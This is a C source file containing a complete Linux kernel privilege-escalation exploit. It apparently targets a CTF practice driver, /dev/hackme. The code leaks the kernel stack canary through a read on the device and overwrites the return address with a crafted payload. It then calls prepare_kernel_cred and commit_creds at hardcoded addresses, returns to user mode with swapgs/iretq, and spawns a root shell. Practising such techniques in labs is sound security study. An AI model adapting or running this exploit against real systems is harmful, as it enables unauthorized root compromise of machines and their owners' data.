#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

char *VULN_DRV = "/dev/hackme";

int64_t global_fd;
uint64_t cookie;
uint8_t cookie_off = 16;

void spawn_shell();
uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0xffffffff814c67f0;
uint64_t commit_creds = 0xffffffff814c6410;
uint64_t user_rip = (uint64_t)spawn_shell;

void open_module() {
  global_fd = open(VULN_DRV, O_RDWR);
  if (global_fd < 0) {
    printf("that bai ddkhi open %s\n", VULN_DRV);
    exit(-1);
  } else {
    printf("[+] successfully opened %s\n", VULN_DRV);
  }
}

void leak_cookie_canary() {
  uint8_t size = 40;
  uint64_t leak[size];
  printf("[*] trying to leak up to %ld bytes memory\n", sizeof(leak));
  uint64_t data = read(global_fd, leak, sizeof(leak));
  cookie = leak[cookie_off];
  for (int i = 0; i < size; i++) {
    printf("\nleak[%d]: 0x%lx", i, leak[i]);
  }
  printf("\nfound stack canary: 0x%lx @ index %d\n", cookie, cookie_off);
}
void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
  puts("[+] Saved state");
}

void privesc() {
  __asm__(".intel_syntax noprefix;"
          "movabs rax, prepare_kernel_cred;"
          "xor rdi, rdi;"
          "call rax;"
          "mov rdi, rax;"
          "movabs rax, commit_creds;"
          "call rax;"
          "swapgs;"
          "mov r15, user_ss;"
          "push r15;"
          "mov r15, user_sp;"
          "push r15;"
          "mov r15, user_rflags;"
          "push r15;"
          "mov r15, user_cs;"
          "push r15;"
          "mov r15, user_rip;" // Where we return to!
          "push r15;"
          "iretq;"
          ".att_syntax;");
}
void write_rip() {
  uint8_t sz = 50;
  uint64_t payload[sz];
  payload[cookie_off++] = cookie;
  payload[cookie_off++] = 0;
  payload[cookie_off++] = 0;
  payload[cookie_off++] = 0;
  payload[cookie_off++] = (uint64_t)privesc;

  uint64_t data = write(global_fd, payload, sizeof(payload));
  if (data < 0) {
    printf("write fail T_T\n");
    exit(-1);
  } else {
    printf("write successfully\n");
  }
}

void spawn_shell() {
  puts("[*] Hello from user land!");
  uid_t uid = getuid();
  printf("[+] UID: %d\n", uid);

  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};

  execve("/bin/sh", argv, envp);

  perror("execve failed");
  exit(-1);
}
int main() {
  open_module();
  leak_cookie_canary();
  save_state();
  write_rip();
  return 0;
}
